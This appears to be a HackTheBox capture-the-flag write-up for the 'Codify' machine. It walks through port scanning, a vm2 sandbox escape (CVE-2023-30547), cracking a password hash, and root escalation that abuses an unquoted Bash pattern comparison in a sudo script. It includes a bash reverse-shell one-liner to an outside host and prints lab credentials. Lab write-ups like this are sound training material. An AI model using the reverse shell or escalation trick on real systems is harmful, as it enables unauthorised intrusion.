---
title: "Codify - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Codify
![](https://kar0nx.github.io/assets/images/writeup/57b977ea744af01a5454c8643a850e59.png)
## Reconnaissance

IP: 10.10.11.239
## NMAP

```
nmap -T4 -p- -A 10.10.11.239
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:21 UTC
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   30.42 ms 10.10.14.1
2   30.75 ms codify.htb (10.10.11.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.48 seconds
```

add to /etc/hosts
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901142135.png)

ffuf found /limitations

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901143106.png)

in /about we see that is running vm2 sandbox for JavaScript JS

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901142619.png)

searching google I found RCE https://nvd.nist.gov/vuln/detail/cve-2023-30547

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901142919.png)

Paste poc code and we escaped sadnbox

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901142904.png)

editing command to bash reverse shell we got it 
```
("bash -c 'bash -i >& /dev/tcp/10.10.14.8/8080 0>&1'")
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901143336.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901144039.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901144057.png)

/opt should be empty but it isn't I found script here:
no access to /var/backups/mysql maybe later

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901144935.png)

in /var/www/contact I found db file contains password hash

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901150027.png)

I was able to crack this password with hashcat 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901150219.png)

joshua spongebob1
and we can connect via ssh as joshua

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901150330.png)

## Privilege Escalation

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901150421.png)

```
mysql -u joshua -pspongebob1 -h 0.0.0.0
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901152147.png)

```
select user,password from user;
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901152127.png)

Can't crack it. Let's review source code again.
Got it 
![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901153206.png)

within a Bash `[[ ... ]]` conditional expression, the == operator (and !=) treats the unquoted right-hand operand as a pattern, not a literal string. For example, `[[ $var == "*" ]]`
Now we need to start any snooper (I user PSPY32) in second session (second ssh)
so let's execute 
```
sudo /opt/scripts/mysql-backup.sh
```
and just type `*`

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901153408.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901153835.png)

Great we got password:
root kljh12k3jhaskjh12kjh3

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250901154103.png)

And grab root.txt